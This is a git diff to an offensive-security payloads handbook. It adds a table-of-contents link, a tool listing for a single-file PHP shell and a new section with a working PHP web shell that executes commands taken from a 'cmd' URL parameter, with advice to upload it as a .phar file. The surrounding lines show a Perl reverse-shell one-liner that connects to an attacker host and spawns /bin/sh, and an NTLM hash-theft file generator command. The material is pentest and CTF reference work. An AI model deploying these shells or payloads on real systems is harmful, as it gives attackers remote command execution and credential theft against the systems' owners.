@@ -26,6 +26,7 @@
 - [ntlm_theft](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#ntml_theft)
 - [PDF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PDF)
 - [Perl Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Perl-Reverse-Shell)
+- [PHP popen Web Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PHP-popen-Web-Shell)
 - [PHP Web Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PHP-Web-Shell)
 - [PowerShell Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PowerShell-Reverse-Shell)
 - [Python Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Python-Reverse-Shell)
@@ -50,6 +51,7 @@
 | marshalsec | Java Unmarshaller Security | https://github.com/mbechler/marshalsec |
 | Nishang | Offensive PowerShell for red team, penetration testing and offensive security. | https://github.com/samratashok/nishang |
 | ntlm_theft | A tool for generating multiple types of NTLMv2 hash theft files. | https://github.com/Greenwolf/ntlm_theft |
+| p0wny@shell:~# | Single-file PHP shell | https://github.com/flozz/p0wny-shell |
 | Payload Box | Payload Collection | https://github.com/payloadbox |
 | PayloadsAllTheThings | A list of useful payloads and bypass for Web Application Security and Pentest/CTF. | https://github.com/swisskyrepo/PayloadsAllTheThings |
 | phpgcc | PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. | https://github.com/ambionics/phpggc |
@@ -426,6 +428,21 @@ $ python3 ntlm_theft.py --generate all --server <RHOST> --filename <FOLDER>
 
 ```c
 perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+## PHP popen Web Shell
+
+> https://www.php.net/manual/en/function.popen.php
+
+Upload it for example as `webshell.phar`.
+
+```c
+<?php
+$command = $_GET['cmd'];
+$handle = popen($command, 'r');
+$output = fgets($handle);
+echo $output;
+?>
 ```
 
 ## PHP Web Shell
